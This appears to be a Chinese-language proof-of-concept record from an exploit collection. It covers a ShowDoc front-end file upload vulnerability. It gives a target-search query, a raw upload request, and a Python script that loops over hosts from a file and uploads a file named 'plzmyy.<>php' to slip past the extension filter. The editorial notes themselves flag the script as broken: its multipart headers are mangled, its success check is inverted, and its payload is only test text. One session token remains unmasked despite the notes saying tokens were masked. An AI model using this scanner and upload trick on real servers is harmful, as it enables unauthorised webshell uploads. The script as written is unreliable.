---
source: "Threekiii/Awesome-POC"
product: "ShowDoc page.uploading"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ShowDoc 前台文件上传漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：uploading入口/<>扩展清洗，示例含cookie_token会话但鉴权未确认"
side_effects: "未执行；本文需注意的操作影响：host行未strip含换行；上传内容只是123123test非PHP证明；版本缺，PR1059是核验入口"
source_status: "unknown"
id: "vw-1a926bb3154b64ac126c9a97"
entity_id: "ve-1a926bb3154b64ac126c9a97"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：uploading入口/&lt;&gt;扩展清洗，示例含cookie_token会话但鉴权未确认

- **结论使用边界（1）**：multipart头Content - Disposition/form - data被空格破坏，boundary末尾也写- -；不能原样请求。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：if response.text in 'success'方向反了，空响应也可能True，JSON成功响应通常False；没有shell执行验证。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（3）**：host行未strip含换行；上传内容只是123123test非PHP证明；版本缺，PR1059是核验入口。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ShowDoc 前台文件上传漏洞

## 漏洞描述

参考链接：

- https://github.com/star7th/showdoc/pull/1059

## 网络测绘

```
app="ShowDoc"
```

## 漏洞复现

poc：

```
POST /server/index.php?s=/home/page/uploading HTTP/1.1
上传图片，并抓包，将文件名改为plzmyy.<>php
```

```python
import requests
requests.packages.urllib3.disable_warnings()

test = open('url.txt',"r")
for host in test.readlines():
    url = host+"/server/index.php?s=/home/page/uploading"
    payload = """------WebKitFormBoundary5j2IsrTFPjJCVtwU
    Content - Disposition: form - data;name = "editormd-image-file";filename = "plzmyy.<>php"
    Content - Type: text / plain

    123123test
    ------WebKitFormBoundary5j2IsrTFPjJCVtwU - -"""
    headers = {
        "Cookie": "PHPSESSID=shp********************4f1; think_language=zh-CN; cookie_token=8ff04b9bba8b6abf30ab5e0be6cceea2192c9cf7a90d73b2d34d025d84feea2d",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Dest": "iframe",
        "Accept-Encoding": "gzip, deflate",
        "Sec-Fetch-Mode": "navigate",
        "sec-ch-ua": "\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
        "sec-ch-ua-mobile": "?0",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Content-Length": "212",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary5j2IsrTFPjJCVtwU"
    }
    try:
        response = requests.request("POST", url, data=payload, headers=headers, verify=False, timeout=5)
    except:
        continue

    if response.text in 'success':
        print(response.text)
```


---

> 来源：Threekiii/Awesome-POC
